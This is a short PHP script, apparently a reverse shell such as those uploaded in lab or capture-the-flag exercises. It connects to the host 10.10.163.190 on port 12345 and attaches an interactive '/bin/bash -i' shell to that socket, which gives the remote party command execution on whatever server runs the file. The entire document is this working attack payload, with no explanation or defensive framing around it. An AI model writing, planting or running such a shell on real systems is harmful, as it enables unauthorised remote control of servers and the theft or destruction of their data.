<?php
$ip = '10.10.163.190';
$port = 12345;
$sock=fsockopen($ip, $port);
$proc = proc_open("/bin/bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>